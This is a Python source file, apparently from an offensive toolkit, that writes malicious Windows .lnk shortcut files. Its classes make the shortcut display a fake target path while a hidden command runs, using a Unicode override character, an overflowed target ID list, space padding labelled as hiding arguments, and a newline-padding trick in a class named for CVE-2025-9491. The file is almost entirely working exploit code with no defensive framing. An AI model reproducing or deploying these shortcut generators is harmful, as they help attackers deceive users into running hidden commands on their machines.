import io
import logging
from abc import ABC, abstractmethod
from dataclasses import dataclass

from .byte_tools import ByteTools
from .lnk_tools import ITEM, LINK_INFO, LINKTARGET_IDLIST, SHELL_LINK_HEADER, ANSI_ENCODING


@dataclass
class LnkDetails(ABC):
    target_path: str
    target_cmd: str
    fake_path: str
    icon_path: str
    icon_index: int
    output_path: str


class LnkWriter(ABC):
    @staticmethod
    @abstractmethod
    def _write_(f: io.BufferedWriter, lnk: LnkDetails) -> None:
        raise NotImplementedError("write() is not implemented")

    @classmethod
    def write(cls, lnk: LnkDetails) -> None:
        try:
            with open(lnk.output_path, 'wb') as f:
                logging.info("successfully parsed arguments")
                cls._write_(f, lnk)
            logging.info("successfully generated %s" % lnk.output_path)
        except Exception as e:
            logging.error(e)


class LnkWriterFakeTargetExe(LnkWriter):
    @staticmethod
    def _write_(f: io.BufferedWriter, lnk: LnkDetails) -> None:
        # Process `fake_path`
        FORBIDDEN_CHARACTERS = ["<", ">", '"', "|", "?", "*"]
        if not any(char in FORBIDDEN_CHARACTERS for char in lnk.fake_path):
            logging.warning(f"adding double quotes{' and RTL character' if lnk.target_cmd else ''} to fake path \"%s\"" % lnk.fake_path)
            lnk.fake_path = f'"{lnk.fake_path}"{'\u202D' if lnk.target_cmd else ''}'

        # SHELL LINK HEADER
        f.write(SHELL_LINK_HEADER.write(link_flags=[SHELL_LINK_HEADER.LinkFlags.HasLinkTargetIDList,
                                                    SHELL_LINK_HEADER.LinkFlags.HasArguments if lnk.target_cmd else SHELL_LINK_HEADER.LinkFlags.IGNORE,
                                                    SHELL_LINK_HEADER.LinkFlags.HasIconLocation,
                                                    SHELL_LINK_HEADER.LinkFlags.IsUnicode,
                                                    SHELL_LINK_HEADER.LinkFlags.HasExpString],
                                        file_attributes=[],
                                        show_command=SHELL_LINK_HEADER.ShowCommand.SW_SHOWNORMAL,
                                        icon_index=lnk.icon_index))
        # LINKTARGET IDLIST
        f.write(LINKTARGET_IDLIST(LINKTARGET_IDLIST.path_to_idlist(lnk.target_path)).write())
        # STRING DATA
        if lnk.target_cmd:
            f.write(ByteTools.create_bytes(len(lnk.target_cmd), 2) + lnk.target_cmd.encode('utf-16le'))
        f.write(ByteTools.create_bytes(len(lnk.icon_path), 2) + lnk.icon_path.encode('utf-16le'))
        # EXTRA DATA
        f.write(ByteTools.create_bytes(0x00000314, 4) + ByteTools.create_bytes(0xA0000001, 4)
                + lnk.fake_path.encode(ANSI_ENCODING) + ByteTools.create_bytes(0x00, 260-len(lnk.fake_path.encode(ANSI_ENCODING)))
                + lnk.fake_path.encode('utf-16le') + ByteTools.create_bytes(0x00, 520-len(lnk.fake_path.encode('utf-16le')))
                + ByteTools.create_bytes(0x00, 4))


class LnkWriterDisableWithoutArguments(LnkWriter):
    @staticmethod
    def _write_(f: io.BufferedWriter, lnk: LnkDetails) -> None:
        # SHELL LINK HEADER
        f.write(SHELL_LINK_HEADER.write(link_flags=[SHELL_LINK_HEADER.LinkFlags.HasLinkTargetIDList,
                                                    SHELL_LINK_HEADER.LinkFlags.HasArguments if lnk.target_cmd else SHELL_LINK_HEADER.LinkFlags.IGNORE,
                                                    SHELL_LINK_HEADER.LinkFlags.HasIconLocation,
                                                    SHELL_LINK_HEADER.LinkFlags.IsUnicode,
                                                    SHELL_LINK_HEADER.LinkFlags.HasExpString,
                                                    # SHELL_LINK_HEADER.LinkFlags.PreferEnvironmentPath  # must be disabled
                                                    ],
                                        file_attributes=[],
                                        show_command=SHELL_LINK_HEADER.ShowCommand.SW_SHOWNORMAL,
                                        icon_index=lnk.icon_index))
        # LINKTARGET IDLIST
        f.write(LINKTARGET_IDLIST(LINKTARGET_IDLIST.path_to_idlist(lnk.target_path)).write())
        # STRING DATA
        if lnk.target_cmd:
            f.write(ByteTools.create_bytes(len(lnk.target_cmd), 2) + lnk.target_cmd.encode('utf-16le'))
        f.write(ByteTools.create_bytes(len(lnk.icon_path), 2) + lnk.icon_path.encode('utf-16le'))
        # EXTRA DATA
        f.write(ByteTools.create_bytes(0x00000314, 4) + ByteTools.create_bytes(0xA0000001, 4)
                + b"" + ByteTools.create_bytes(0x00, 260)
                + b"" + ByteTools.create_bytes(0x00, 520)
                + ByteTools.create_bytes(0x00, 4))


class LnkWriterOverflow(LnkWriter):
    @staticmethod
    def _write_(f: io.BufferedWriter, lnk: LnkDetails) -> None:
        # SHELL LINK HEADER
        f.write(SHELL_LINK_HEADER.write(link_flags=[SHELL_LINK_HEADER.LinkFlags.HasLinkTargetIDList,
                                                    SHELL_LINK_HEADER.LinkFlags.HasLinkInfo,  # required
                                                    # SHELL_LINK_HEADER.LinkFlags.ForceNoLinkInfo, # must be disabled
                                                    SHELL_LINK_HEADER.LinkFlags.HasArguments if lnk.target_cmd else SHELL_LINK_HEADER.LinkFlags.IGNORE,
                                                    SHELL_LINK_HEADER.LinkFlags.HasIconLocation,
                                                    SHELL_LINK_HEADER.LinkFlags.IsUnicode,
                                                    SHELL_LINK_HEADER.LinkFlags.HasExpString,
                                                    # SHELL_LINK_HEADER.LinkFlags.PreferEnvironmentPath, # must be disabled
                                                    ],
                                        file_attributes=[],
                                        show_command=SHELL_LINK_HEADER.ShowCommand.SW_SHOWNORMAL,
                                        icon_index=lnk.icon_index))
        # LINKTARGET IDLIST
        f.write(LINKTARGET_IDLIST([LINKTARGET_IDLIST.ItemID(ITEM.COMPUTER), LINKTARGET_IDLIST.ItemID(ITEM.C_DRIVE), LINKTARGET_IDLIST.ItemID(ITEM.generate_file("C:\\" + "_"*1000))]).write())  # This 'overflows' IDLIST and disables the target field
        logging.info("successfully overflowed LINKTARGET_IDLIST")
        # LINKINFO
        f.write(LINK_INFO.write([LINK_INFO.LinkInfoFlags.CommonNetworkRelativeLinkAndPathSuffix], path=lnk.target_path))  # required
        # STRING DATA
        if lnk.target_cmd:
            f.write(ByteTools.create_bytes(len(lnk.target_cmd), 2) + lnk.target_cmd.encode('utf-16le'))
        f.write(ByteTools.create_bytes(len(lnk.icon_path), 2) + lnk.icon_path.encode('utf-16le'))
        # EXTRA DATA
        if lnk.target_cmd and len(lnk.fake_path) < 60:
            logging.warning("Padding fake path with spaces to visually hide command-line arguments")
            if not lnk.fake_path[-1] == '"':
                lnk.fake_path += '"'
            lnk.fake_path = lnk.fake_path.ljust(255, " ")
        f.write(ByteTools.create_bytes(0x00000314, 4) + ByteTools.create_bytes(0xA0000001, 4)
                + lnk.fake_path.encode(ANSI_ENCODING) + ByteTools.create_bytes(0x00, 260-len(lnk.fake_path.encode(ANSI_ENCODING)))
                + lnk.fake_path.encode('utf-16le') + ByteTools.create_bytes(0x00, 520-len(lnk.fake_path.encode('utf-16le')))
                + ByteTools.create_bytes(0x00, 4))


class LnkWriterFakeExeDisabled(LnkWriter):
    @staticmethod
    def _write_(f: io.BufferedWriter, lnk: LnkDetails) -> None:
        # SHELL LINK HEADER
        f.write(SHELL_LINK_HEADER.write(link_flags=[SHELL_LINK_HEADER.LinkFlags.HasLinkTargetIDList,
                                                    SHELL_LINK_HEADER.LinkFlags.HasArguments if lnk.target_cmd else SHELL_LINK_HEADER.LinkFlags.IGNORE,
                                                    SHELL_LINK_HEADER.LinkFlags.HasIconLocation,
                                                    SHELL_LINK_HEADER.LinkFlags.HasExpString],
                                        file_attributes=[],
                                        show_command=SHELL_LINK_HEADER.ShowCommand.SW_SHOWNORMAL,
                                        icon_index=lnk.icon_index))
        # LINKTARGET IDLIST
        f.write(LINKTARGET_IDLIST(LINKTARGET_IDLIST.path_to_idlist(lnk.fake_path)).write())
        if lnk.target_cmd:
            f.write(ByteTools.create_bytes(len(lnk.target_cmd), 2) + lnk.target_cmd.encode(ANSI_ENCODING))
        # STRING DATA
        f.write(ByteTools.create_bytes(len(lnk.icon_path), 2) + lnk.icon_path.encode(ANSI_ENCODING))
        # EXTRA DATA
        f.write(ByteTools.create_bytes(0x00000314, 4) + ByteTools.create_bytes(0xA0000001, 4)
                + lnk.target_path.encode(ANSI_ENCODING) + ByteTools.create_bytes(0x00, 260-len(lnk.target_path.encode(ANSI_ENCODING)))
                + ''.encode('utf-16le') + ByteTools.create_bytes(0x00, 520)
                + ByteTools.create_bytes(0x00, 4))


class LnkWriterCVE20259491(LnkWriter):
    @staticmethod
    def _write_(f: io.BufferedWriter, lnk: LnkDetails) -> None:
        # SHELL LINK HEADER
        f.write(SHELL_LINK_HEADER.write(link_flags=[SHELL_LINK_HEADER.LinkFlags.HasArguments,
                                                    SHELL_LINK_HEADER.LinkFlags.HasIconLocation,
                                                    SHELL_LINK_HEADER.LinkFlags.HasExpString],
                                        file_attributes=[],
                                        show_command=SHELL_LINK_HEADER.ShowCommand.SW_SHOWNORMAL,
                                        icon_index=lnk.icon_index))

        # STRING DATA
        padding_characters = '\x0A\x0D'
        target_cmd = (padding_characters * (256//len(padding_characters))) + lnk.target_cmd
        f.write(ByteTools.create_bytes(len(target_cmd), 2) + target_cmd.encode(ANSI_ENCODING))
        f.write(ByteTools.create_bytes(len(lnk.icon_path), 2) + lnk.icon_path.encode(ANSI_ENCODING))
        # EXTRA DATA
        f.write(ByteTools.create_bytes(0x00000314, 4) + ByteTools.create_bytes(0xA0000001, 4)
                + lnk.target_path.encode(ANSI_ENCODING) + ByteTools.create_bytes(0x00, 260-len(lnk.target_path.encode(ANSI_ENCODING)))
                + lnk.target_path.encode('utf-16le') + ByteTools.create_bytes(0x00, 520)
                + ByteTools.create_bytes(0x00, 4))
